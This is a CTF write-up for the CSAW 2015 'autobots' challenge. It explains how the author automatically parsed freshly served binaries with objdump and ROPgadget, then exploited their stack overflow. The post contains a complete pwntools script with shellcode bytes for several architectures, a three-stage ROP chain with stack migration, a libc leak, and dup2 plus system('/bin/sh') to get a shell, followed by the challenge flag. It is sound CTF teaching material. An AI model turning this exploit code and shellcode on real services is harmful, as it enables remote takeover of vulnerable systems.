---
title: CSAW CTF 2015 -- autobots
tags:
  - Python
  - CSAW
  - CTF
  - PPC
  - Pwnable
  - ROP
categories:
  - write-ups
date: 2015-09-22 15:33:00
---
**Category:** Exploitable
**Points:** 350  

> I hear bots are playing ctfs now.
> `nc 52.20.10.244 8888`

<!-- more -->  

Once we connect to the service, it will send us a 64 bit ELF binary. 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    size_t v3; // rax@1
    __int16 s; // [sp+0h] [bp-80h]@1
    uint16_t v6; // [sp+2h] [bp-7Eh]@1
    int v7; // [sp+4h] [bp-7Ch]@1
    char buf; // [sp+10h] [bp-70h]@1
    int v9; // [sp+78h] [bp-8h]@1
    int fd; // [sp+7Ch] [bp-4h]@1

    fd = socket(2, 1, 0);
    memset(&s, 0, 0x10uLL);
    s = 2;
    v7 = htons(0);
    v6 = htons(0xF5A6u); // port number
    bind(fd, (const struct sockaddr *)&s, 0x10u);
    listen(fd, 10);
    v9 = accept(fd, 0LL, 0LL);
    read(v9, &buf, 0x1E0uLL); // BOF vulnerability
    v3 = strlen(&buf);
    return write(v9, &buf, v3 + 1);
}
```

We can see that this binary was another socket server program, which has a simple stack overflow vulnerability in it. But after I reversed the binary, got the port number and connected to the service, it gave me nothing.  

At first I thought this was such a crap, but then I found out that each time I connected to the original service, **it'll gave me a different binary**. It's still a socket server program, which wait for our connection, read the input and output our input, but it has a different port number, different buffer location & different reading size.  

After having some discussion with my teammates, we figure out that maybe the challenge want us to exploit the service like a bot, which means that we'll have to figure out the port number, buffer size and try to exploit the service -- all done fully automatically.  

So the first thing we'll have to do is to retrieve some informations in the binary, such as port number, buffer's location and reading size. By using **objdump**, we can analyze the assembly and retrieve those informations:  

```
.................
  4007c8:       bf a6 f5 00 00          mov    $0xf5a6,%edi     <-- port number = 0xf5a6
  4007cd:       e8 2e fe ff ff          callq  400600 <htons@plt>
...................
  40082d:       48 8d 45 90             lea    -0x70(%rbp),%rax     <-- buffer's location (offset from rbp)
  400831:       48 89 c7                mov    %rax,%rdi
  400834:       e8 b7 fd ff ff          callq  4005f0 <strlen@plt>
....................
  400816:       8b 45 f8                mov    -0x8(%rbp),%eax
  400819:       ba e0 01 00 00          mov    $0x1e0,%edx     <-- reading size
  40081e:       48 89 ce                mov    %rcx,%rsi
  400821:       89 c7                   mov    %eax,%edi
  400823:       b8 00 00 00 00          mov    $0x0,%eax
  400828:       e8 f3 fd ff ff          callq  400620 <read@plt>

```

Now we figure out the port number, we can connect to the service immediately after we get the binary. This time, it actually wait for me to input a string and send it back to me.  

So we're on the right track, time to exploit the service. Notice that sometimes the binary's not exploitable, because its reading size might be smaller than the buffer's offset from the `rbp`. Anyway, once we know that the service is exploitable, we can send our payload and try to do the **ROP attack** ( the binary has enable the DEP protection ).  

But before that, there're few things we need to beware of:
1. It's a socket server, so if we want to spawn a shell and execute our own command, **we'll have to use `dup2()` to copy `stdin` & `stdout` to our socket fd.**
2. Our socket fd is **6**, we can leak it with the help of the `write` function
3. The socket fd is also on stack, so while overwriting the return address, the socket fd should remain the same.  
    
Consider that the reading size might not be big enough to read the whole ROP chain, I decide to use the **stack migration** trick:
1. After overwriting the return address in main function, the first thing we do is to read the 2nd ROP chain to a data segment (buffer1) , and change the stack to buffer1 ( by using the `pop rbp; ret` and `leave; ret` gadget )
2. The 2nd ROP chain is to leak the address in libc, read the 3rd ROP chain to buffer2, and change the stack to buffer2
3. Finally the 3rd ROP chain will do `dup2(6, 0)`, `dup2(6, 1)` and `system("/bin/sh")` 
    
We can use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find some useful gadgets, such as `pop rdi; ret` and `pop rsi; pop r15; ret` for setting the function parameters. Notice that although we can't find a gadget to control `rdx` (storing the 3rd function parameter), but since only `read` and `write` function need the third parameter, we can leverage the fact that **the program has already set the `rdx` for us in the main function** (for writing our output).  

So to sum it up:
1. Use objdump to get the port number, buffer location and reading size
2. Use ROPgadget to find some useful gadgets (for setting parameters & stack migration)
3. Overwrite the return address, notice that the socket fd should not be modified
4. First ROP chain: read the 2nd ROP chain to buffer1 and change the stack 
5. Second ROP chain: leak libc's base address, read the 3rd ROP chain to buffer2 and change the stack
6. Third ROP chain: do `dup2(6, 0)`, `dup2(6, 1)` and `system("/bin/sh")`
 
For finding the libc version, here's an useful tool: [libc database](https://github.com/niklasb/libc-database)

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "52.20.10.244"
PORT = 8888
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
#context.arch = 'i386'
#context.arch = 'arm'
#context.arch = 'aarch64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def sc(arch=context.arch):
    if arch == "i386":
        # shellcraft.i386.linux.sh(), null free, 22 bytes
        return "\x6a\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80"
    elif arch == "amd64":
        # shellcraft.amd64.linux.sh(), null free, 24 bytes
        return "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
    elif arch == "arm":
        # null free, 27 bytes
        return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    elif arch == "aarch64":
        # 4 null bytes, total 35 bytes
        return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
    else:
        return None

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

if __name__ == "__main__":

    while True:
        myexec("nc 52.20.10.244 8888 > asdf") # download binary
        
        resp = myexec("objdump -d ./asdf | grep \"htons\" -B 1") # get port number
        resp = resp.split("--\n")[2]
        port = resp[resp.index("0x"):resp.index(","):]
        port = int(port, 16)
        
        resp = myexec("objdump -d ./asdf | grep \"strlen\" -B 2") # get buffer offset
        resp = resp.split("lea    -")[1]
        offset = int(resp[:resp.index("(%rbp"):], 16)
        
        resp = myexec("objdump -d ./asdf | grep \"read\" -B 4") # read size
        resp = resp.split("mov")[1]
        resp = resp[resp.index("0x"):resp.index(","):]
        read = int(resp, 16)

        print "==================="
        log.success("port: "+str(port))
        log.success("offset: "+hex(offset))
        log.success("read: "+hex(read))
        
        if read < 0x80 or read < offset or offset-8 < 0x78: # exploitable or not
            continue

        r = remote(HOST, port)
        elf = ELF("./asdf")
        
        # use ROPgadget to find some useful address
        pop_rdi = int(myexec("ROPgadget --binary ./asdf | grep \"pop rdi\"").split(" ")[0], 16)
        pop_rsi_r15 = int(myexec("ROPgadget --binary ./asdf | grep \"pop rsi \"").split(" ")[0], 16)
        leave = int(myexec("ROPgadget --binary ./asdf | grep \"leave\"").split(" ")[0], 16)
        pop_rbp = int(myexec("ROPgadget --binary ./asdf | grep \": pop rbp ; ret$\"").split(" ")[0], 16)

        log.success("pop_rdi: "+hex(pop_rdi))
        log.success("pop_rsi_r15: "+hex(pop_rsi_r15))
        log.success("leave: "+hex(leave))
        log.success("pop_rbp: "+hex(pop_rbp))
        buf1 = 0x00602000 - 0x200
        buf2 = 0x00602000 - 0x300

        payload = "A"*(offset-8)
        payload += p32(6) # socket fd
        payload += p32(3)
        payload += "B"*8 # rbp
        payload += p64(pop_rdi) # return address
        payload += p64(6)
        payload += p64(pop_rsi_r15)
        payload += p64(buf1) # read the 2nd ROP chain to buffer1
        payload += p64(0)
        payload += p64(elf.symbols['read']) # read(6, buffer1, len)
        payload += p64(pop_rbp) # stack migration
        payload += p64(buf1-8)
        payload += p64(leave)
        r.send(payload)
        r.recvrepeat(0.5)

        payload = p64(pop_rdi)
        payload += p64(6)
        payload += p64(pop_rsi_r15)
        payload += p64(elf.got['write']) # leak write's GOT
        payload += p64(0)
        payload += p64(elf.symbols['write']) # write(6, write@got.plt, len)
        payload += p64(pop_rdi)
        payload += p64(6)
        payload += p64(pop_rsi_r15)
        payload += p64(buf2) # read the 3rd ROP chain to buffer2
        payload += p64(0)
        payload += p64(elf.symbols['read']) # read(6, buffer2, len) 
        payload += p64(pop_rbp) # stack migration
        payload += p64(buf2-8)
        payload += p64(leave)
        r.send(payload)
       
        write_addr = (u64(r.recv(6).ljust(8, "\x00")))
        log.success("write_addr: "+hex(write_addr))

        # thanks to libc database
        # offset_system = 0x0000000000046640
        # offset_dup2 = 0x00000000000ebfe0
        # offset_read = 0x00000000000eb800
        # offset_write = 0x00000000000eb860
        # offset_str_bin_sh = 0x17ccdb
        
        libc_base = write_addr - 0xeb860
        system_addr = libc_base + 0x46640
        dup2_addr = libc_base + 0xebfe0
        sh_addr = libc_base + 0x17ccdb
    
        log.success("libc_base: "+hex(libc_base))
        log.success("system_addr: "+hex(system_addr))
        log.success("dup2_addr: "+hex(dup2_addr))
        log.success("sh_addr: "+hex(sh_addr))
        
        payload = p64(pop_rdi)
        payload += p64(6)
        payload += p64(pop_rsi_r15)
        payload += p64(0)
        payload += p64(0)
        payload += p64(dup2_addr) # dup2(6, 0)
        payload += p64(pop_rdi)
        payload += p64(6)
        payload += p64(pop_rsi_r15)
        payload += p64(1)
        payload += p64(0)
        payload += p64(dup2_addr) # dup2(6, 1)
        payload += p64(pop_rdi)
        payload += p64(sh_addr)
        payload += p64(system_addr) #system("/bin/sh")
        r.send(payload)

        r.interactive()
```

And finally we get the flag: `flag{c4nt_w4it_f0r_cgc_7h15_y34r}`  
CGC huh, well...I'm not sure about that :/ but anyway this is a pretty good challenge :)
